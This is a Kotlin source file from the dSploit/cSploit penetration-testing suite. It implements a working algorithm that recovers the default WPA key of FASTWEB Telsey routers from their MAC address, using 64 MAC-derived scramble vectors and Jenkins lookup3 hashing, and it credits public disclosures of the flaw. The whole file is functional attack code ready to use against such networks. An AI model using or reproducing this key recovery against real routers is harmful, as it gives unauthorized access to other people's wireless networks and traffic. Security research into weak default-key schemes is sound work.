/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.strix.data.wifi.algorithms

import org.csploit.strix.data.wifi.Keygen
import org.csploit.strix.data.wifi.algorithms.helpers.JenkinsHash

/**
 * FASTWEB Telsey WPA key recovery.
 *
 * SSID forms: FASTWEB-1-002196XXXXXX / FASTWEB-1-00036FXXXXXX
 *
 * Uses Bob Jenkins' lookup3 hashword with MAC-derived scramble vectors.
 *
 * Credit:
 *  http://www.pcpedia.it/Hacking/algoritmi-di-generazione-wpa-alice-e-fastweb-e-lavidita-del-sapere.html
 *  http://wifiresearchers.wordpress.com/2010/09/09/telsey-fastweb-full-disclosure/
 */
class TelseyKeygen(
    ssid: String, mac: String, level: Int, enc: String
) : Keygen(ssid, mac, level, enc) {

    private fun scrambler(macStr: String): LongArray {
        val vector = LongArray(64)
        val mv = ByteArray(6)
        for (i in 0 until 12 step 2)
            mv[i / 2] = ((Character.digit(macStr[i], 16) shl 4) +
                    Character.digit(macStr[i + 1], 16)).toByte()

        fun b(idx: Int): Long = (0xFF and mv[idx].toInt()).toLong()

        vector[0]  = 0xFFFFFFFFL and ((b(5) shl 24) or (b(1) shl 16) or (b(0) shl 8) or b(5))
        vector[1]  = 0xFFFFFFFFL and ((b(1) shl 24) or (b(0) shl 16) or (b(1) shl 8) or b(5))
        vector[2]  = 0xFFFFFFFFL and ((b(4) shl 24) or (b(2) shl 16) or (b(3) shl 8) or b(2))
        vector[3]  = 0xFFFFFFFFL and ((b(4) shl 24) or (b(3) shl 16) or (b(2) shl 8) or b(2))
        vector[4]  = 0xFFFFFFFFL and ((b(2) shl 24) or (b(4) shl 16) or (b(2) shl 8) or b(0))
        vector[5]  = 0xFFFFFFFFL and ((b(2) shl 24) or (b(5) shl 16) or (b(3) shl 8) or b(1))
        vector[6]  = 0xFFFFFFFFL and ((b(0) shl 24) or (b(4) shl 16) or (b(0) shl 8) or b(1))
        vector[7]  = 0xFFFFFFFFL and ((b(1) shl 24) or (b(4) shl 16) or (b(1) shl 8) or b(0))
        vector[8]  = 0xFFFFFFFFL and ((b(2) shl 24) or (b(4) shl 16) or (b(2) shl 8) or b(2))
        vector[9]  = 0xFFFFFFFFL and ((b(3) shl 24) or (b(1) shl 16) or (b(3) shl 8) or b(4))
        vector[10] = 0xFFFFFFFFL and ((b(4) shl 24) or (b(1) shl 16) or (b(4) shl 8) or b(3))
        vector[11] = 0xFFFFFFFFL and ((b(5) shl 24) or (b(1) shl 16) or (b(5) shl 8) or b(5))
        vector[12] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(1) shl 16) or (b(0) shl 8) or b(5))
        vector[13] = 0xFFFFFFFFL and ((b(1) shl 24) or (b(0) shl 16) or (b(1) shl 8) or b(1))
        vector[14] = 0xFFFFFFFFL and ((b(4) shl 24) or (b(2) shl 16) or (b(1) shl 8) or b(3))
        vector[15] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(3) shl 16) or (b(5) shl 8) or b(2))
        vector[16] = 0xFFFFFFFFL and ((b(4) shl 24) or (b(4) shl 16) or (b(5) shl 8) or b(4))
        vector[17] = 0xFFFFFFFFL and ((b(5) shl 24) or (b(1) shl 16) or (b(4) shl 8) or b(0))
        vector[18] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(5) shl 16) or (b(0) shl 8) or b(5))
        vector[19] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(1) shl 16) or (b(3) shl 8) or b(5))
        vector[20] = 0xFFFFFFFFL and ((b(5) shl 24) or (b(2) shl 16) or (b(2) shl 8) or b(4))
        vector[21] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(3) shl 16) or (b(1) shl 8) or b(4))
        vector[22] = 0xFFFFFFFFL and ((b(0) shl 24) or (b(4) shl 16) or (b(4) shl 8) or b(3))
        vector[23] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(0) shl 16) or (b(5) shl 8) or b(3))
        vector[24] = 0xFFFFFFFFL and ((b(4) shl 24) or (b(3) shl 16) or (b(0) shl 8) or b(0))
        vector[25] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(2) shl 16) or (b(1) shl 8) or b(1))
        vector[26] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(1) shl 16) or (b(2) shl 8) or b(5))
        vector[27] = 0xFFFFFFFFL and ((b(1) shl 24) or (b(3) shl 16) or (b(4) shl 8) or b(3))
        vector[28] = 0xFFFFFFFFL and ((b(0) shl 24) or (b(2) shl 16) or (b(3) shl 8) or b(4))
        vector[29] = 0xFFFFFFFFL and ((b(0) shl 24) or (b(0) shl 16) or (b(2) shl 8) or b(2))
        vector[30] = 0xFFFFFFFFL and ((b(0) shl 24) or (b(0) shl 16) or (b(0) shl 8) or b(5))
        vector[31] = 0xFFFFFFFFL and ((b(1) shl 24) or (b(1) shl 16) or (b(1) shl 8) or b(4))
        vector[32] = 0xFFFFFFFFL and ((b(4) shl 24) or (b(0) shl 16) or (b(2) shl 8) or b(2))
        vector[33] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(3) shl 16) or (b(3) shl 8) or b(0))
        vector[34] = 0xFFFFFFFFL and ((b(0) shl 24) or (b(2) shl 16) or (b(4) shl 8) or b(1))
        vector[35] = 0xFFFFFFFFL and ((b(5) shl 24) or (b(5) shl 16) or (b(5) shl 8) or b(0))
        vector[36] = 0xFFFFFFFFL and ((b(0) shl 24) or (b(4) shl 16) or (b(5) shl 8) or b(0))
        vector[37] = 0xFFFFFFFFL and ((b(1) shl 24) or (b(1) shl 16) or (b(5) shl 8) or b(2))
        vector[38] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(2) shl 16) or (b(5) shl 8) or b(1))
        vector[39] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(3) shl 16) or (b(2) shl 8) or b(3))
        vector[40] = 0xFFFFFFFFL and ((b(1) shl 24) or (b(0) shl 16) or (b(2) shl 8) or b(4))
        vector[41] = 0xFFFFFFFFL and ((b(1) shl 24) or (b(5) shl 16) or (b(2) shl 8) or b(5))
        vector[42] = 0xFFFFFFFFL and ((b(0) shl 24) or (b(1) shl 16) or (b(4) shl 8) or b(0))
        vector[43] = 0xFFFFFFFFL and ((b(1) shl 24) or (b(1) shl 16) or (b(1) shl 8) or b(4))
        vector[44] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(2) shl 16) or (b(2) shl 8) or b(2))
        vector[45] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(3) shl 16) or (b(3) shl 8) or b(3))
        vector[46] = 0xFFFFFFFFL and ((b(5) shl 24) or (b(4) shl 16) or (b(0) shl 8) or b(1))
        vector[47] = 0xFFFFFFFFL and ((b(4) shl 24) or (b(0) shl 16) or (b(5) shl 8) or b(5))
        vector[48] = 0xFFFFFFFFL and ((b(1) shl 24) or (b(0) shl 16) or (b(5) shl 8) or b(0))
        vector[49] = 0xFFFFFFFFL and ((b(0) shl 24) or (b(1) shl 16) or (b(5) shl 8) or b(1))
        vector[50] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(2) shl 16) or (b(4) shl 8) or b(2))
        vector[51] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(4) shl 16) or (b(4) shl 8) or b(3))
        vector[52] = 0xFFFFFFFFL and ((b(4) shl 24) or (b(3) shl 16) or (b(1) shl 8) or b(5))
        vector[53] = 0xFFFFFFFFL and ((b(5) shl 24) or (b(5) shl 16) or (b(1) shl 8) or b(4))
        vector[54] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(0) shl 16) or (b(1) shl 8) or b(5))
        vector[55] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(1) shl 16) or (b(0) shl 8) or b(4))
        vector[56] = 0xFFFFFFFFL and ((b(4) shl 24) or (b(2) shl 16) or (b(2) shl 8) or b(5))
        vector[57] = 0xFFFFFFFFL and ((b(4) shl 24) or (b(3) shl 16) or (b(3) shl 8) or b(1))
        vector[58] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(4) shl 16) or (b(3) shl 8) or b(0))
        vector[59] = 0xFFFFFFFFL and ((b(2) shl 24) or (b(3) shl 16) or (b(5) shl 8) or b(1))
        vector[60] = 0xFFFFFFFFL and ((b(3) shl 24) or (b(1) shl 16) or (b(2) shl 8) or b(3))
        vector[61] = 0xFFFFFFFFL and ((b(5) shl 24) or (b(0) shl 16) or (b(1) shl 8) or b(2))
        vector[62] = 0xFFFFFFFFL and ((b(5) shl 24) or (b(3) shl 16) or (b(4) shl 8) or b(1))
        vector[63] = 0xFFFFFFFFL and ((b(0) shl 24) or (b(2) shl 16) or (b(3) shl 8) or b(0))

        return vector
    }

    override fun getKeys(): List<String>? {
        val hash = JenkinsHash()
        if (this.mac.isEmpty()) {
            errorMessage = "This key cannot be generated without MAC address."
            return null
        }
        val key = scrambler(this.mac)
        var seed = 0L

        for (x in 0 until 64) {
            seed = hash.hashword(key, x, seed)
        }

        var s1 = java.lang.Long.toHexString(seed)
        while (s1.length < 8) s1 = "0$s1"

        for (x in 0 until 64) {
            when {
                x < 8 -> key[x] = (key[x] shl 3) and 0xFFFFFFFF
                x < 16 -> key[x] = key[x] ushr 5
                x < 32 -> key[x] = key[x] ushr 2
                else -> key[x] = (key[x] shl 7) and 0xFFFFFFFF
            }
        }

        seed = 0
        for (x in 0 until 64) {
            seed = hash.hashword(key, x, seed)
        }
        var s2 = java.lang.Long.toHexString(seed)
        while (s2.length < 8) s2 = "0$s2"

        addPassword(s1.substring(s1.length - 5) + s2.substring(0, 5))
        return getResults()
    }
}
